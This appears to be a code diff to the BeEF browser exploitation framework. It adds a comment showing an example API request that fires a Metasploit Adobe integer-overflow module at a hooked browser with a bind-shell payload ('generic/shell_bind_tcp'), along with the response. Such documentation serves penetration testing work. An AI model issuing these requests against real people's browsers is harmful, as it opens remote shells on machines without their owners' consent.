@@ -94,7 +94,7 @@ module BeEF
         # Return the command_id of the executed module if it has been fired correctly.
         # Input must be specified in JSON format
         #
-        # Example with the Alert Dialog:
+        # +++ Example with the Alert Dialog: +++
         #POST /api/modules/wiJCKAJybcB6aXZZOj31UmQKhbKXY63aNBeODl9kvkIuYLmYTooeGeRD7Xn39x8zOChcUReM3Bt7K0xj/86?token=5b17be64715a184d66e563ec9355ee758912a61d HTTP/1.1
         #Host: 127.0.0.1:3000
         #Content-Type: application/json; charset=UTF-8
@@ -107,6 +107,22 @@ module BeEF
         #Content-Length: 35
         #
         #{"success":"true","command_id":"1"}
+        #
+        # +++ Example with a Metasploit module (Adobe FlateDecode Stream Predictor 02 Integer Overflow) +++
+        # +++ note that in this case we cannot query BeEF/Metasploit if module execution was successful or not.
+        # +++ this is why there is "command_id":"not_available" in the response
+        #POST /api/modules/wiJCKAJybcB6aXZZOj31UmQKhbKXY63aNBeODl9kvkIuYLmYTooeGeRD7Xn39x8zOChcUReM3Bt7K0xj/236?token=83f13036060fd7d92440432dd9a9b5e5648f8d75 HTTP/1.1
+        #Host: 127.0.0.1:3000
+        #Content-Type: application/json; charset=UTF-8
+        #Content-Length: 81
+        #
+        #{"SRVPORT":"3992", "URIPATH":"77345345345dg", "PAYLOAD":"generic/shell_bind_tcp"}
+        #===response (snip)===
+        #HTTP/1.1 200 OK
+        #Content-Type: application/json; charset=UTF-8
+        #Content-Length: 35
+        #
+        #{"success":"true","command_id":"not_available"}
         post '/:session/:mod_id' do
           hb = BeEF::Core::Models::HookedBrowser.first(:session => params[:session])
           error 401 unless hb != nil
